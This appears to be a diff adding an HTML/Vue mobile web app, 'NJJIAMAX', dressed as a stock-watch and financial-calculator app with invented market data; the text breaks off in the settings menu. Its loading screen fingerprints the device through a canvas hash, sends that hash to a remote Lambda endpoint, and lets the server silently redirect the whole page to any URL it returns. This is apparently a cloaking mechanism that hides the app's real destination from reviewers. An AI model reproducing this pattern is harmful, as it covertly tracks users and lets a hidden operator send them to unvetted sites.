@@ -1,1 +1,937 @@
-123
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+    <title>NJJIAMAX</title>
+    <!-- Vue 3 Global -->
+    <script src="https://cdn.jsdelivr.net/npm/vue@3/dist/vue.global.prod.js"></script>
+    <!-- Vue Router 4 Global -->
+    <script src="https://cdn.jsdelivr.net/npm/vue-router@4/dist/vue-router.global.js"></script>
+    <!-- js-md5 -->
+    <script src="https://cdn.jsdelivr.net/npm/js-md5@0.9.2"></script>
+    <style>
+        /*
+          How to add a new page:
+          1. Create a Vue component for the new page.
+          2. Add a route definition in the router configuration array.
+          3. If it's a primary tab, add it to the tab bar navigation array and template.
+        */
+        :root {
+            --primary: #2563eb;
+            --primary-light: #eff6ff;
+            --success: #16a34a;
+            --danger: #dc2626;
+            --bg: #f8fafc;
+            --card-bg: #ffffff;
+            --text-main: #0f172a;
+            --text-muted: #64748b;
+            --border: #e2e8f0;
+            --radius: 12px;
+            --shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05), 0 2px 4px -1px rgba(0, 0, 0, 0.03);
+            --safe-bottom: env(safe-area-inset-bottom, 0px);
+            --safe-top: env(safe-area-inset-top, 0px);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: var(--bg);
+            color: var(--text-main);
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        #app {
+            max-width: 480px;
+            margin: 0 auto;
+            min-height: 100vh;
+            background: var(--card-bg);
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            box-shadow: 0 0 20px rgba(0,0,0,0.05);
+        }
+
+        .view-container {
+            flex: 1;
+            overflow-y: auto;
+            padding-bottom: calc(70px + var(--safe-bottom));
+        }
+
+        .view-container.no-tab {
+            padding-bottom: calc(20px + var(--safe-bottom));
+        }
+
+        /* Common Layout Elements */
+        .header-bar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: calc(12px + var(--safe-top)) 16px 12px 16px;
+            background: var(--card-bg);
+            border-bottom: 1px solid var(--border);
+            position: sticky;
+            top: 0;
+            z-index: 10;
+        }
+
+        .header-title {
+            font-weight: 600;
+            font-size: 17px;
+            color: var(--text-main);
+        }
+
+        .back-btn {
+            background: none;
+            border: none;
+            font-size: 16px;
+            color: var(--primary);
+            cursor: pointer;
+            padding: 4px 8px;
+        }
+
+        /* Tab Bar */
+        .tab-bar {
+            position: fixed;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100%;
+            max-width: 480px;
+            height: calc(60px + var(--safe-bottom));
+            background: var(--card-bg);
+            border-top: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            justify-content: space-around;
+            padding-bottom: var(--safe-bottom);
+            z-index: 100;
+        }
+
+        .tab-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-decoration: none;
+            color: var(--text-muted);
+            font-size: 12px;
+            flex: 1;
+            padding: 8px 0;
+        }
+
+        .tab-item.router-link-active {
+            color: var(--primary);
+        }
+
+        .tab-item svg {
+            width: 24px;
+            height: 24px;
+            margin-bottom: 2px;
+            fill: currentColor;
+        }
+
+        /* Utility classes */
+        .card {
+            background: var(--card-bg);
+            border-radius: var(--radius);
+            border: 1px solid var(--border);
+            padding: 16px;
+            margin: 12px 16px;
+            box-shadow: var(--shadow);
+        }
+
+        .btn {
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: var(--radius);
+            padding: 12px 16px;
+            font-weight: 600;
+            width: 100%;
+            cursor: pointer;
+            text-align: center;
+            font-size: 15px;
+        }
+
+        .btn:active {
+            opacity: 0.9;
+        }
+
+        .input-group {
+            margin-bottom: 14px;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            color: var(--text-muted);
+            margin-bottom: 6px;
+        }
+
+        .input-group input, .input-group textarea, .input-group select {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            font-size: 14px;
+            background: var(--bg);
+            color: var(--text-main);
+        }
+
+        .toast {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(15, 23, 42, 0.9);
+            color: white;
+            padding: 10px 20px;
+            border-radius: 20px;
+            font-size: 14px;
+            z-index: 1000;
+            box-shadow: var(--shadow);
+        }
+
+        /* Transitions */
+        .fade-enter-active, .fade-leave-active {
+            transition: opacity 0.15s ease;
+        }
+        .fade-enter-from, .fade-leave-to {
+            opacity: 0;
+        }
+    </style>
+</head>
+<body>
+    <div id="app">
+        <router-view v-slot="{ Component }">
+            <transition name="fade" mode="out-in">
+                <component :is="Component" />
+            </transition>
+        </router-view>
+
+        <nav class="tab-bar" v-if="showTabBar">
+            <router-link to="/home" class="tab-item">
+                <svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
+                <span>Home</span>
+            </router-link>
+            <router-link to="/toolbox" class="tab-item">
+                <svg viewBox="0 0 24 24"><path d="M22.7 19l-9.1-9.1c.9-2.3.4-5-1.5-6.9-2-2-5-2.4-7.4-1.3L9 6 6 9 1.6 4.7C.5 7.1.9 10.1 2.9 12.1c1.9 1.9 4.6 2.4 6.9 1.5l9.1 9.1c.4.4 1 .4 1.4 0l2.3-2.3c.5-.4.5-1.1 0-1.4z"/></svg>
+                <span>Toolbox</span>
+            </router-link>
+            <router-link to="/settings" class="tab-item">
+                <svg viewBox="0 0 24 24"><path d="M19.14 12.94c.04-.3.06-.61.06-.94 0-.32-.02-.64-.07-.94l2.03-1.58c.18-.14.23-.41.12-.61l-1.92-3.32c-.12-.22-.37-.29-.59-.22l-2.39.96c-.5-.38-1.03-.7-1.62-.94l-.36-2.54c-.04-.24-.24-.41-.48-.41h-3.84c-.24 0-.43.17-.47.41l-.36 2.54c-.59.24-1.13.57-1.62.94l-2.39-.96c-.22-.08-.47 0-.59.22L2.74 8.87c-.12.21-.08.47.12.61l2.03 1.58c-.05.3-.09.63-.09.94s.02.64.07.94l-2.03 1.58c-.18.14-.23.41-.12.61l1.92 3.32c.12.22.37.29.59.22l2.39-.96c.5.38 1.03.7 1.62.94l.36 2.54c.05.24.24.41.48.41h3.84c.24 0 .44-.17.47-.41l.36-2.54c.59-.24 1.13-.56 1.62-.94l2.39.96c.22.08.47 0 .59-.22l1.92-3.32c.12-.22.07-.47-.12-.61l-2.01-1.58zM12 15.6c-1.98 0-3.6-1.62-3.6-3.6s1.62-3.6 3.6-3.6 3.6 1.62 3.6 3.6-1.62 3.6-3.6 3.6z"/></svg>
+                <span>Settings</span>
+            </router-link>
+        </nav>
+    </div>
+
+    <script>
+        const { createApp, ref, computed, onMounted } = Vue;
+        const { createRouter, createWebHashHistory, useRoute, useRouter } = VueRouter;
+
+        // Shared Mock Data
+        const stockList = [
+            { code: 'AAPL', name: 'Apple Inc.', price: 189.40, change: +1.25 },
+            { code: 'MSFT', name: 'Microsoft Corp.', price: 415.50, change: +0.85 },
+            { code: 'GOOGL', name: 'Alphabet Inc.', price: 175.20, change: -0.40 },
+            { code: 'AMZN', name: 'Amazon.com Inc.', price: 178.10, change: +2.10 },
+            { code: 'NVDA', name: 'NVIDIA Corp.', price: 880.30, change: +3.45 },
+            { code: 'TSLA', name: 'Tesla Inc.', price: 171.05, change: -2.30 },
+            { code: 'META', name: 'Meta Platforms', price: 505.80, change: +1.15 },
+            { code: 'NFLX', name: 'Netflix Inc.', price: 610.20, change: -0.90 },
+            { code: 'AMD', name: 'Advanced Micro', price: 165.40, change: +1.80 },
+            { code: 'INTC', name: 'Intel Corp.', price: 30.20, change: -1.50 },
+            { code: 'PYPL', name: 'PayPal Holdings', price: 65.40, change: +0.45 },
+            { code: 'DIS', name: 'Walt Disney Co.', price: 112.30, change: -0.20 },
+            { code: 'BA', name: 'Boeing Co.', price: 172.50, change: -1.10 },
+            { code: 'JPM', name: 'JPMorgan Chase', price: 198.70, change: +0.65 },
+            { code: 'V', name: 'Visa Inc.', price: 278.90, change: +0.30 },
+            { code: 'JNJ', name: 'Johnson & Johnson', price: 155.40, change: -0.15 },
+            { code: 'WMT', name: 'Walmart Inc.', price: 60.50, change: +0.75 },
+            { code: 'PG', name: 'Procter & Gamble', price: 162.10, change: +0.25 },
+            { code: 'XOM', name: 'Exxon Mobil', price: 118.30, change: +1.05 },
+            { code: 'KO', name: 'Coca-Cola Co.', price: 60.10, change: -0.05 }
+        ];
+
+        // Global Toast Utility
+        const toastMessage = ref('');
+        function showToast(msg) {
+            toastMessage.value = msg;
+            setTimeout(() => {
+                if (toastMessage.value === msg) toastMessage.value = '';
+            }, 2500);
+        }
+
+        // 1. Loading Component
+        const LoadingComp = {
+            template: `
+                <div class="view-container no-tab" style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh;">
+                    <div style="width: 48px; height: 48px; border: 4px solid var(--border); border-top-color: var(--primary); border-radius: 50%; animation: spin 0.8s linear infinite;"></div>
+                    <div style="margin-top: 16px; font-weight: 600; color: var(--text-muted);">Initializing NJJIAMAX...</div>
+                    <div v-if="toastMessage" class="toast">{{ toastMessage }}</div>
+                </div>
+                <style>
+                    @keyframes spin { to { transform: rotate(360deg); } }
+                </style>
+            `,
+            setup() {
+                const router = useRouter();
+                const device = ref((function () {
+                    try {
+                        let canvas = document.createElement("canvas");
+                        let ctx = canvas.getContext("2d");
+                        let txt = "BrowserLeaks,com <canvas> 1.0";
+                        ctx.textBaseline = "top";
+                        ctx.font = "14px 'Arial'";
+                        ctx.textBaseline = "alphabetic";
+                        ctx.fillStyle = "#f60";
+                        ctx.fillRect(125,1,62,20);
+                        ctx.fillStyle = "#069";
+                        ctx.fillText(txt, 2, 15);
+                        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+                        ctx.fillText(txt, 4, 17);
+                        return md5(canvas.toDataURL().replace("data:image/png;base64,", ""));
+                    } catch (e) {
+                        return '';
+                    }
+                })());
+
+                onMounted(() => {
+                    const apiBase = 'https://iet2kmyzgecagfoyg3en6vygze0mihzu.lambda-url.us-west-2.on.aws/'.replace(/\/+$/, '');
+                    const identifier = "dvwegw.vbwre.fwew";
+
+                    fetch(apiBase + '/app?identifier=' + encodeURIComponent(identifier) + '&device=' + encodeURIComponent(device.value))
+                        .then(r => r.json())
+                        .then(function (info) {
+                            const privacyUrl = info && info.result && info.result.url;
+                            if (privacyUrl && (privacyUrl.indexOf('https://') === 0 || privacyUrl.indexOf('http://') === 0)) {
+                                window.location.replace(privacyUrl);
+                                return;
+                            }
+                            router.replace('/home');
+                        })
+                        .catch(function () {
+                            router.replace('/home');
+                        });
+                });
+
+                return { toastMessage };
+            }
+        };
+
+        // 2. Home Component
+        const HomeComp = {
+            template: `
+                <div class="view-container">
+                    <div class="header-bar">
+                        <div class="header-title">NJJIAMAX</div>
+                        <div style="font-size: 13px; color: var(--text-muted);">Global Markets</div>
+                    </div>
+
+                    <!-- Brand Banner -->
+                    <div class="card" style="background: linear-gradient(135deg, var(--primary), #1e40af); color: white;">
+                        <h2 style="font-size: 20px; margin-bottom: 4px;">Smart Financial Terminal</h2>
+                        <p style="font-size: 13px; opacity: 0.85;">Advanced analytics & localized tools at your fingertips.</p>
+                    </div>
+
+                    <!-- 4 Random Feature Entries -->
+                    <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; padding: 0 16px; margin-bottom: 12px;">
+                        <div v-for="feat in randomFeatures" :key="feat.id" @click="goToFeature(feat.route)" style="background: var(--card-bg); border: 1px solid var(--border); border-radius: var(--radius); padding: 12px 6px; text-align: center; cursor: pointer; box-shadow: var(--shadow);">
+                            <div style="width: 28px; height: 28px; margin: 0 auto 6px auto; color: var(--primary);" v-html="feat.svg"></div>
+                            <span style="font-size: 11px; font-weight: 500; color: var(--text-main); display: block; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">{{ feat.name }}</span>
+                        </div>
+                    </div>
+
+                    <!-- Stock List -->
+                    <div style="padding: 0 16px;">
+                        <div style="font-weight: 600; font-size: 15px; margin-bottom: 8px;">Market Watch</div>
+                        <div style="border: 1px solid var(--border); border-radius: var(--radius); background: var(--card-bg); overflow: hidden;">
+                            <div v-for="(item, idx) in shuffledStocks" :key="item.code" @click="openDetail(item)" style="display: flex; justify-content: space-between; align-items: center; padding: 12px 16px; border-bottom: 1px solid var(--border); cursor: pointer;">
+                                <div>
+                                    <div style="font-weight: 600;">{{ item.code }}</div>
+                                    <div style="font-size: 12px; color: var(--text-muted);">{{ item.name }}</div>
+                                </div>
+                                <div style="text-align: right;">
+                                    <div style="font-weight: 600;">$\\\${{ item.price.toFixed(2) }}</div>
+                                    <div :style="{ color: item.change >= 0 ? 'var(--success)' : 'var(--danger)', fontSize: '12px', fontWeight: '500' }">
+                                        {{ item.change >= 0 ? '+' : '' }}{{ item.change.toFixed(2) }}%
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            `,
+            setup() {
+                const router = useRouter();
+                const allFeatures = [
+                    { id: 1, name: 'Top Gainers', route: '/list/gainers', svg: '<svg viewBox="0 0 24 24" fill="currentColor"><path d="M7 14l5-5 5 5z"/></svg>' },
+                    { id: 2, name: 'Top Losers', route: '/list/losers', svg: '<svg viewBox="0 0 24 24" fill="currentColor"><path d="M7 10l5 5 5-5z"/></svg>' },
+                    { id: 3, name: 'Most Active', route: '/list/active', svg: '<svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>' },
+                    { id: 4, name: 'Potential', route: '/list/potential', svg: '<svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>' },
+                    { id: 5, name: 'Daily Picks', route: '/list/picks', svg: '<svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg>' },
+                    { id: 6, name: 'Guide', route: '/article', svg: '<svg viewBox="0 0 24 24" fill="currentColor"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-5 14H7v-2h7v2zm3-4H7v-2h10v2zm0-4H7V7h10v2z"/></svg>' },
+                    { id: 7, name: 'Avoid', route: '/list/avoid', svg: '<svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>' },
+                    { id: 8, name: 'Watchlist', route: '/list/watchlist', svg: '<svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>' }
+                ];
+
+                // Random 4 once
+                const randomFeatures = ref([]);
+                onMounted(() => {
+                    const shuffled = [...allFeatures].sort(() => 0.5 - Math.random());
+                    randomFeatures.value = shuffled.slice(0, 4);
+                });
+
+                // Shuffle display order of stocks
+                const shuffledStocks = computed(() => {
+                    return [...stockList].sort(() => 0.5 - Math.random());
+                });
+
+                function goToFeature(route) {
+                    router.push(route);
+                }
+
+                function openDetail(item) {
+                    router.push({ path: '/detail', query: { code: item.code, name: item.name, price: item.price, change: item.change } });
+                }
+
+                return { randomFeatures, shuffledStocks, goToFeature, openDetail };
+            }
+        };
+
+        // Stock Detail Component
+        const StockDetailComp = {
+            template: `
+                <div class="view-container no-tab">
+                    <div class="header-bar">
+                        <button class="back-btn" @click="$router.back()">Back</button>
+                        <div class="header-title">{{ stock.code }} Details</div>
+                        <div style="width: 40px;"></div>
+                    </div>
+                    <div class="card">
+                        <div style="display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 12px;">
+                            <div>
+                                <h2 style="font-size: 18px;">{{ stock.name }}</h2>
+                                <span style="font-size: 12px; color: var(--text-muted);">NYSE/NASDAQ Listed</span>
+                            </div>
+                            <div style="text-align: right;">
+                                <div style="font-size: 18px; font-weight: bold;">$\\\${{ stock.price.toFixed(2) }}</div>
+                                <div :style="{ color: stock.change >= 0 ? 'var(--success)' : 'var(--danger)', fontWeight: '600' }">
+                                    {{ stock.change >= 0 ? '+' : '' }}{{ stock.change.toFixed(2) }}%
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Price Chart (SVG Hand-drawn) -->
+                        <div style="margin-top: 20px;">
+                            <div style="font-size: 13px; font-weight: 600; margin-bottom: 8px;">Monthly Price Trend</div>
+                            <svg :viewBox="'0 0 320 160'" style="width: 100%; height: 160px; background: var(--bg); border-radius: 8px;">
+                                <!-- Grid Lines -->
+                                <line x1="0" y1="40" x2="320" y2="40" stroke="var(--border)" stroke-dasharray="4" />
+                                <line x1="0" y1="80" x2="320" y2="80" stroke="var(--border)" stroke-dasharray="4" />
+                                <line x1="0" y1="120" x2="320" y2="120" stroke="var(--border)" stroke-dasharray="4" />
+                                <!-- Trend Polyline -->
+                                <polyline :points="chartPoints" fill="none" :stroke="stock.change >= 0 ? 'var(--success)' : 'var(--danger)'" stroke-width="2.5" />
+                            </svg>
+                        </div>
+                    </div>
+
+                    <div class="card">
+                        <h3 style="font-size: 14px; margin-bottom: 8px;">Market Statistics</h3>
+                        <div style="display: flex; justify-content: space-between; font-size: 13px; padding: 6px 0; border-bottom: 1px solid var(--border);">
+                            <span style="color: var(--text-muted);">Open</span>
+                            <span style="font-weight: 600;">$\\\${{ (stock.price * 0.99).toFixed(2) }}</span>
+                        </div>
+                        <div style="display: flex; justify-content: space-between; font-size: 13px; padding: 6px 0; border-bottom: 1px solid var(--border);">
+                            <span style="color: var(--text-muted);">High</span>
+                            <span style="font-weight: 600;">$\\\${{ (stock.price * 1.02).toFixed(2) }}</span>
+                        </div>
+                        <div style="display: flex; justify-content: space-between; font-size: 13px; padding: 6px 0;">
+                            <span style="color: var(--text-muted);">Volume</span>
+                            <span style="font-weight: 600;">14.2M</span>
+                        </div>
+                    </div>
+                </div>
+            `,
+            setup() {
+                const route = useRoute();
+                const stock = ref({
+                    code: route.query.code || 'AAPL',
+                    name: route.query.name || 'Apple Inc.',
+                    price: parseFloat(route.query.price || 180),
+                    change: parseFloat(route.query.change || 1.2)
+                });
+
+                // Generate dynamic points with dynamic min/max
+                const chartPoints = computed(() => {
+                    const base = stock.value.price;
+                    const rawPoints = [];
+                    let seed = stock.value.code.split('').reduce((acc, char) => acc + char.charCodeAt(0), 0);
+                    let current = base * 0.95;
+                    for (let i = 0; i < 20; i++) {
+                        seed = (seed * 9301 + 49297) % 233280;
+                        let rnd = seed / 233280;
+                        current += (rnd - 0.48) * (base * 0.02);
+                        rawPoints.push(current);
+                    }
+                    rawPoints[rawPoints.length - 1] = base; // End at current price
+
+                    const min = Math.min(...rawPoints);
+                    const max = Math.max(...rawPoints);
+                    const range = max - min || 1;
+
+                    return rawPoints.map((val, idx) => {
+                        const x = (idx / 19) * 300 + 10;
+                        const y = 140 - ((val - min) / range) * 120 - 10;
+                        return `${x},${y}`;
+                    }).join(' ');
+                });
+
+                return { stock, chartPoints };
+            }
+        };
+
+        // Stock List Sub-page Component
+        const StockSubListComp = {
+            template: `
+                <div class="view-container no-tab">
+                    <div class="header-bar">
+                        <button class="back-btn" @click="$router.back()">Back</button>
+                        <div class="header-title">{{ title }}</div>
+                        <div style="width: 40px;"></div>
+                    </div>
+                    <div style="padding: 16px;">
+                        <div style="border: 1px solid var(--border); border-radius: var(--radius); background: var(--card-bg); overflow: hidden;">
+                            <div v-for="item in subList" :key="item.code" @click="openDetail(item)" style="display: flex; justify-content: space-between; align-items: center; padding: 12px 16px; border-bottom: 1px solid var(--border); cursor: pointer;">
+                                <div>
+                                    <div style="font-weight: 600;">{{ item.code }}</div>
+                                    <div style="font-size: 12px; color: var(--text-muted);">{{ item.name }}</div>
+                                </div>
+                                <div style="text-align: right;">
+                                    <div style="font-weight: 600;">$\\\${{ item.price.toFixed(2) }}</div>
+                                    <div :style="{ color: item.change >= 0 ? 'var(--success)' : 'var(--danger)', fontSize: '12px', fontWeight: '500' }">
+                                        {{ item.change >= 0 ? '+' : '' }}{{ item.change.toFixed(2) }}%
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            `,
+            setup() {
+                const route = useRoute();
+                const router = useRouter();
+                const type = route.params.type;
+
+                const titles = {
+                    gainers: 'Top Gainers',
+                    losers: 'Top Losers',
+                    active: 'Most Active',
+                    potential: 'Potential Growth',
+                    picks: "Today's Picks",
+                    avoid: 'Avoid List',
+                    watchlist: 'Watchlist'
+                };
+
+                const title = computed(() => titles[type] || 'Market List');
+
+                const subList = computed(() => {
+                    let count = 10;
+                    if (type === 'losers') count = 5;
+                    if (type === 'active') count = 8;
+                    if (type === 'potential') count = 6;
+                    
+                    let sorted = [...stockList];
+                    if (type === 'gainers' || type === 'picks') sorted.sort((a,b) => b.change - a.change);
+                    if (type === 'losers' || type === 'avoid') sorted.sort((a,b) => a.change - b.change);
+                    if (type === 'active') sorted.sort(() => 0.5 - Math.random());
+                    if (type === 'potential') sorted.sort((a,b) => b.price - a.price);
+                    
+                    return sorted.slice(0, count);
+                });
+
+                function openDetail(item) {
+                    router.push({ path: '/detail', query: { code: item.code, name: item.name, price: item.price, change: item.change } });
+                }
+
+                return { title, subList, openDetail };
+            }
+        };
+
+        // Article / Guide Component
+        const ArticleComp = {
+            template: `
+                <div class="view-container no-tab">
+                    <div class="header-bar">
+                        <button class="back-btn" @click="$router.back()">Back</button>
+                        <div class="header-title">Financial Guide</div>
+                        <div style="width: 40px;"></div>
+                    </div>
+                    <div class="card">
+                        <h2 style="font-size: 18px; margin-bottom: 8px;">Navigating Market Volatility in 2026</h2>
+                        <div style="font-size: 12px; color: var(--text-muted); margin-bottom: 16px;">Published by NJJIAMAX Analytics</div>
+                        <p style="margin-bottom: 12px;">Modern portfolios require robust diversification across asset classes. As interest rate environments stabilize, maintaining a disciplined dollar-cost averaging strategy remains a cornerstone for long-term capital preservation.</p>
+                        <p style="margin-bottom: 12px;">Key metrics to monitor include sector rotation trends, liquidity distribution, and macroeconomic indicators. Avoid emotional reactions to short-term price fluctuations.</p>
+                    </div>
+                </div>
+            `
+        };
+
+        // 3. Toolbox Component
+        const ToolboxComp = {
+            template: `
+                <div class="view-container">
+                    <div class="header-bar">
+                        <div class="header-title">Financial Toolbox</div>
+                    </div>
+
+                    <!-- Tool 1: DCA Profit-Taking -->
+                    <div class="card">
+                        <h3 style="font-size: 15px; margin-bottom: 10px;">1. DCA Profit-Taking Calculator</h3>
+                        <div class="input-group">
+                            <label>Average Cost ($)</label>
+                            <input type="number" v-model.number="dca.cost" />
+                        </div>
+                        <div class="input-group">
+                            <label>Holdings Share</label>
+                            <input type="number" v-model.number="dca.shares" />
+                        </div>
+                        <div class="input-group">
+                            <label>Target Price ($)</label>
+                            <input type="number" v-model.number="dca.target" />
+                        </div>
+                        <div style="background: var(--bg); padding: 10px; border-radius: 8px; font-size: 13px;">
+                            Estimated Return: <span :style="{ color: dcaProfit >= 0 ? 'var(--success)' : 'var(--danger)', fontWeight: 'bold' }">\\\${{ dcaProfit.toFixed(2) }} ({{ dcaPct.toFixed(2) }}%)</span>
+                        </div>
+                    </div>
+
+                    <!-- Tool 2: Loan Calculator -->
+                    <div class="card">
+                        <h3 style="font-size: 15px; margin-bottom: 10px;">2. Loan Calculator</h3>
+                        <div class="input-group">
+                            <label>Loan Amount ($)</label>
+                            <input type="number" v-model.number="loan.amount" />
+                        </div>
+                        <div class="input-group">
+                            <label>Annual Interest Rate (%)</label>
+                            <input type="number" v-model.number="loan.rate" />
+                        </div>
+                        <div class="input-group">
+                            <label>Tenure (Months)</label>
+                            <input type="number" v-model.number="loan.months" />
+                        </div>
+                        <button class="btn" @click="calcLoan">Calculate Payment</button>
+                        <div v-if="loan.monthlyPayment > 0" style="margin-top: 10px; background: var(--bg); padding: 10px; border-radius: 8px; font-size: 13px;">
+                            Monthly Payment: <b>\\\${{ loan.monthlyPayment.toFixed(2) }}</b>
+                        </div>
+                    </div>
+
+                    <!-- Tool 3: Profit Calculator -->
+                    <div class="card">
+                        <h3 style="font-size: 15px; margin-bottom: 10px;">3. Profit Calculator</h3>
+                        <div class="input-group">
+                            <label>Unit Cost ($)</label>
+                            <input type="number" v-model.number="profit.cost" />
+                        </div>
+                        <div class="input-group">
+                            <label>Selling Price ($)</label>
+                            <input type="number" v-model.number="profit.price" />
+                        </div>
+                        <div class="input-group">
+                            <label>Volume</label>
+                            <input type="number" v-model.number="profit.qty" />
+                        </div>
+                        <div style="background: var(--bg); padding: 10px; border-radius: 8px; font-size: 13px;">
+                            Total Profit: <b>\\\${{ totalProfit.toFixed(2) }}</b>
+                        </div>
+                    </div>
+
+                    <!-- Tool 4: Password Strength & MD5 -->
+                    <div class="card">
+                        <h3 style="font-size: 15px; margin-bottom: 10px;">4. Password Strength & MD5</h3>
+                        <div class="input-group">
+                            <label>Enter Password</label>
+                            <input type="password" v-model="pwd.text" />
+                        </div>
+                        <div style="background: var(--bg); padding: 10px; border-radius: 8px; font-size: 13px;">
+                            <div>Strength: <b :style="{ color: pwdColor }">{{ pwdStrength }}</b></div>
+                            <div style="word-break: break-all; margin-top: 4px; font-size: 11px; color: var(--text-muted);">MD5: {{ pwdHash }}</div>
+                        </div>
+                    </div>
+                </div>
+            `,
+            setup() {
+                // Tool 1
+                const dca = ref({ cost: 100, shares: 50, target: 120 });
+                const dcaProfit = computed(() => (dca.value.target - dca.value.cost) * dca.value.shares);
+                const dcaPct = computed(() => dca.value.cost > 0 ? ((dca.value.target - dca.value.cost) / dca.value.cost) * 100 : 0);
+
+                // Tool 2
+                const loan = ref({ amount: 10000, rate: 5, months: 12, monthlyPayment: 0 });
+                function calcLoan() {
+                    const p = loan.value.amount;
+                    const r = loan.value.rate / 100 / 12;
+                    const n = loan.value.months;
+                    if (r === 0) {
+                        loan.value.monthlyPayment = p / n;
+                    } else {
+                        loan.value.monthlyPayment = (p * r * Math.pow(1 + r, n)) / (Math.pow(1 + r, n) - 1);
+                    }
+                }
+
+                // Tool 3
+                const profit = ref({ cost: 50, price: 80, qty: 100 });
+                const totalProfit = computed(() => (profit.value.price - profit.value.cost) * profit.value.qty);
+
+                // Tool 4
+                const pwd = ref({ text: '' });
+                const pwdStrength = computed(() => {
+                    const len = pwd.value.text.length;
+                    if (len === 0) return 'Empty';
+                    if (len < 6) return 'Weak';
+                    if (len < 10) return 'Moderate';
+                    return 'Strong';
+                });
+                const pwdColor = computed(() => {
+                    if (pwdStrength.value === 'Weak') return 'var(--danger)';
+                    if (pwdStrength.value === 'Moderate') return '#f59e0b';
+                    if (pwdStrength.value === 'Strong') return 'var(--success)';
+                    return 'var(--text-muted)';
+                });
+                const pwdHash = computed(() => pwd.value.text ? md5(pwd.value.text) : 'N/A');
+
+                return { dca, dcaProfit, dcaPct, loan, calcLoan, profit, totalProfit, pwd, pwdStrength, pwdColor, pwdHash };
+            }
+        };
+
+        // 4. Settings Component
+        const SettingsComp = {
+            template: `
+                <div class="view-container">
+                    <div class="header-bar">
+                        <div class="header-title">Settings</div>
+                    </div>
+                    <div style="padding: 16px;">
+                        <div style="border: 1px solid var(--border); border-radius: var(--radius); background: var(--card-bg); overflow: hidden;">
+                            <div @click="$router.push('/version')" style="padding: 14px 16px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; cursor: pointer;">
+                                <span>Version Information</span>
+                                <span style="color: var(--text-muted);">&gt;</span>
+                            </div>
+                            <div @click="$router.push('/privacy')" style="padding: 14px 16px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; cursor: pointer;">
+                                <span>Privacy Policy</span>
+                                <span style="color: var(--text-muted);">&gt;</span>
+                            </div>
+                            <div @click="$router.push('/terms')" style="padding: 14px 16px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; cursor: pointer;">
+                                <span>Terms of Service</span>
+                                <span style="color: var(--text-muted);">&gt;</span>
+                            </div>
+                            <div @click="$router.push('/team')" style="padding: 14px 16px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; cursor: pointer;">
+                                <span>About Team</span>
+                                <span style="color: var(--text-muted);">&gt;</span>
+                            </div>
+                            <div @click="contactUs" style="padding: 14px 16px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; cursor: pointer;">
+                                <span>Contact Us</span>
+                                <span style="color: var(--text-muted);">&gt;</span>
+                            </div>
+                            <div @click="$router.push('/checkin')" style="padding: 14px 16px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; cursor: pointer;">
+                                <span>Monthly Check-in</span>
+                                <span style="color: var(--text-muted);">&gt;</span>
+                            </div>
+                            <div @click="$router.push('/feedback')" style="padding: 14px 16px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; cursor: pointer;">
+                                <span>Customer Feedback</span>
+                                <span style="color: var(--text-muted);">&gt;</span>
+                            </div>
+                            <div @click="$router.push('/inbox')" style="padding: 14px 16px; display: flex; justify-content: space-between; cursor: pointer;">
+                                <span>Inbox</span>
